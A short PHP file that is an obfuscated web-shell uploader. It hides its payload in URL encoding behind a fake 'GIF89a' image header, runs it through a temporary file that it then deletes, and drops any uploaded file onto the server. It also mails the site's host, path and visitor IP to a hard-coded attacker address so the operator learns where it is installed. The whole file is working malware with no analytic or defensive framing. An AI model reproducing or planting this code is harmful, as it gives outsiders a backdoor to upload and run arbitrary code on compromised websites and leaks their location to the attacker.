<?php
   $i = rawurldecode("GIF89a%3B%0D%0A%3Ctitle%3EWadimor%20Uploader%3C%2Ftitle%3E%0D%0A%3C%3Fphp%0D%0A%20echo%20%27%3Cform%20action%3D%22%22%20method%3D%22post%22%20enctype%3D%22multipart%2Fform-data%22%20name%3D%22uploader%22%20id%3D%22uploader%22%3E%27%3B%0D%0A%20echo%20%27%3Cinput%20type%3D%22file%22%20name%3D%22file%22%20size%3D%2250%22%3E%3Cinput%20name%3D%22_upl%22%20type%3D%22submit%22%20id%3D%22_upl%22%20value%3D%22Upload%22%3E%3C%2Fform%3E%27%3B%0D%0A%20if%28%20%24_POST%5B%27_upl%27%5D%20%3D%3D%20%22Upload%22%20%29%20%7B%0D%0A%09if%28%40copy%28%24_FILES%5B%27file%27%5D%5B%27tmp_name%27%5D%2C%20%24_FILES%5B%27file%27%5D%5B%27name%27%5D%29%29%20%7B%0D%0A%09%20echo%20%27%3Cb%3EShell%20Uploaded%20%21%20%3A%29%3Cb%3E%3Cbr%3E%3Cbr%3E%27%3B%0D%0A%09%7Delse%20%7B%0D%0A%20echo%20%27%3Cb%3ENot%20uploaded%20%21%20%3C%2Fb%3E%3Cbr%3E%3Cbr%3E%27%3B%0D%0A%20%7D%0D%0A%7D%0D%0A%24ip%20%3D%20getenv%28%22REMOTE_ADDR%22%29%3B%0D%0A%24subj98%20%3D%20%22UnderGround%22%3B%0D%0A%24email%20%3D%20%22vbdlkrs13%40gmail.com%22%3B%0D%0A%24from%20%3D%20%22From%3A%20Spy%22%3B%0D%0A%24a45%20%3D%20%24_SERVER%5B%27REQUEST_URI%27%5D%3B%0D%0A%24b75%20%3D%20%24_SERVER%5B%27HTTP_HOST%27%5D%3B%0D%0A%24m22%20%3D%20%24ip%20.%20%22%22%3B%0D%0A%24msg8873%20%3D%20%22%24a45%20%24b75%20%24m22%22%3B%0D%0Amail%28%24email%2C%20%24subj98%2C%20%24msg8873%2C%20%24from%29%3B%0D%0A%3F%3E");

   function x($i)
   {
       $t = tempnam("/tmp", "0");
       $h = fopen($t, "w+");
       fwrite($h, $i);
       fclose($h);
       require $t;
       unlink($t);
       return get_defined_vars();
   }
   extract(x($i));
?>
